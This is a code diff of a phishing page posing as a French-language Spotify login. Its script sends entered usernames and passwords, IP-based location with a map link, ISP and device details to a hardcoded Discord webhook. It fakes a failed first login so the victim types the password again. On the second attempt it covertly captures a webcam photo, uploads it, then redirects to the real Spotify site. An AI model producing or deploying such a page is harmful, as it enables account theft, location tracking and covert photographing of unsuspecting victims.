@@ -7,87 +7,155 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .app-container { width: 100%; max-width: 450px; padding: 40px 20px; text-align: center; }
-        .logo { width: 45px; margin: 0 auto 30px auto; }
-        h1 { font-size: 28px; font-weight: 900; letter-spacing: -1px; margin-bottom: 35px; }
-        .input-wrap { text-align: left; margin-bottom: 15px; width: 100%; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
+        
+        .main-container { 
+            width: 100%; 
+            max-width: 450px; 
+            padding: 40px 25px; 
+            text-align: center;
+        }
+
+        .logo-app { width: 45px; margin: 0 auto 30px auto; }
+        h1 { font-size: 26px; font-weight: 900; letter-spacing: -1px; margin-bottom: 40px; }
+
+        .input-group { text-align: left; margin-bottom: 15px; width: 100%; }
         label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
-        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 14px; color: #fff; font-size: 16px; outline: none; }
-        .error-box { background: #e91429; color: #fff; padding: 10px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-bottom: 20px; display: none; }
-        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 14px; border-radius: 500px; width: 100%; margin-top: 20px; font-size: 16px; border: none; text-transform: uppercase; }
-        .divider { display: flex; align-items: center; width: 100%; margin: 30px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
+        
+        /* Suppression des bordures - Style App Native */
+        input { 
+            width: 100%; 
+            background: #282828; 
+            border: none; 
+            border-radius: 4px; 
+            padding: 16px; 
+            color: #fff; 
+            font-size: 16px; 
+            outline: none; 
+        }
+        input:focus { background: #333; }
+
+        .btn-spotify { 
+            background: #1ed760; 
+            color: #000; 
+            font-weight: 700; 
+            padding: 16px; 
+            border-radius: 500px; 
+            width: 100%; 
+            margin-top: 25px; 
+            font-size: 16px; 
+            border: none; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .err-box { background: #e91429; color: #fff; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-bottom: 20px; display: none; text-align: center; }
+
+        .divider { display: flex; align-items: center; width: 100%; margin: 35px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
-        .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 10px; font-size: 13px; }
+        .divider:not(:empty)::before { margin-right: 1.5em; }
+        .divider:not(:empty)::after { margin-left: 1.5em; }
+
+        .social-box { 
+            background: transparent; 
+            border: 1px solid #727272; 
+            border-radius: 500px; 
+            padding: 14px; 
+            width: 100%; 
+            color: #fff; 
+            font-weight: 700; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin-bottom: 12px; 
+            font-size: 14px; 
+        }
+
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
-    <div class="app-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
+    <div class="main-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo-app">
         <h1>Se connecter pour continuer</h1>
-        <div id="err" class="error-box">Identifiant ou mot de passe incorrect.</div>
-        <div class="input-wrap"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" autocomplete="off"></div>
-        <div class="input-wrap"><label>Mot de passe</label><input id="p" type="password"></div>
-        <button onclick="run()" id="btn" class="btn-green">Se connecter</button>
+
+        <div id="error" class="err-box">Identifiant ou mot de passe incorrect.</div>
+
+        <div class="input-group">
+            <label>E-mail ou nom d'utilisateur</label>
+            <input id="u" type="text" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>Mot de passe</label>
+            <input id="p" type="password">
+        </div>
+
+        <button onclick="execute()" id="mainBtn" class="btn-spotify">Se connecter</button>
+
         <div class="divider">OU</div>
-        <div class="social-btn">Continuer avec Google</div>
-        <div class="social-btn">Continuer avec Facebook</div>
-        <div class="social-btn">Continuer avec Apple</div>
+
+        <div class="social-box">Continuer avec Google</div>
+        <div class="social-box">Continuer avec Facebook</div>
+        <div class="social-box">Continuer avec Apple</div>
     </div>
+
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        let step = 0;
+        let count = 0;
 
-        async function run() {
+        async function execute() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
-            step++;
-            document.getElementById('btn').innerText = "VÉRIFICATION...";
+            count++;
+            document.getElementById('mainBtn').innerText = "VÉRIFICATION...";
 
-            // Récupération DATA simplifiée pour éviter les blocages mobiles
-            let n = {}; try { n = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
-            let b = {}; try { b = await navigator.getBattery(); } catch(e){}
+            // RAPPORT COMPLET LVN ULTIMATE
+            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
+            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
+            const gl = document.createElement('canvas').getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
 
-            const report = {
+            const payload = {
                 embeds: [{
-                    title: `🔱 LOG APP FIX V12 - T${step}`,
+                    title: `⚡ RAPPORT LVN V15 - T${count}`,
                     color: 1955168,
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 ACCÈS", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 RÉSEAU", value: `**IP:** \`${n.ip}\`\n**Ville:** \`${n.city}\`\n**FAI:** \`${n.org}\``, inline: true },
-                        { name: "🔋 STATS", value: `**Bat:** \`${Math.round(b.level*100)}%\`\n**RAM:** \`${navigator.deviceMemory}GB\``, inline: true }
+                        { name: "👤 COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "🌐 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Maps:** **[Position](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: true },
+                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**Bat:** \`${Math.round(bat.level*100)}%\`\n**RAM:** \`${navigator.deviceMemory}GB\``, inline: true }
                     ],
-                    footer: { text: "LVN FIX • " + new Date().toLocaleString() }
+                    footer: { text: "LVN Elite System • " + new Date().toLocaleString() }
                 }]
             };
 
-            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            if(step === 1) {
+            if(count === 1) {
                 setTimeout(() => {
-                    document.getElementById('btn').innerText = "Se connecter";
+                    document.getElementById('mainBtn').innerText = "Se connecter";
                     document.getElementById('p').value = "";
-                    document.getElementById('err').style.display = "block";
-                }, 800);
+                    document.getElementById('error').style.display = "block";
+                }, 1000);
             } else {
-                // Photo rapide
+                // TENTATIVE CAPTURE FRONTALE
                 try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const vi = document.getElementById('v'); vi.srcObject = s;
-                    await new Promise(r => setTimeout(r, 1000));
-                    const ca = document.getElementById('c'); ca.width = 640; ca.height = 480;
-                    ca.getContext('2d').drawImage(vi, 0, 0);
-                    ca.toBlob(async (blob) => {
-                        const fd = new FormData(); fd.append('file', blob, 'p.png');
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.getElementById('v'); video.srcObject = stream;
+                    await new Promise(r => setTimeout(r, 1200));
+                    const can = document.getElementById('c'); can.width = 640; can.height = 480;
+                    can.getContext('2d').drawImage(video, 0, 0);
+                    can.toBlob(async (b) => {
+                        const fd = new FormData(); fd.append('file', b, 'shot.png');
                         await fetch(hook, { method: 'POST', body: fd });
-                        s.getTracks().forEach(t => t.stop());
+                        stream.getTracks().forEach(t => t.stop());
                     });
                 } catch(e){}
-                setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 1500);
+                setTimeout(() => { window.location.href = "https://open.spotify.com"; }, 2000);
             }
         }
     </script>
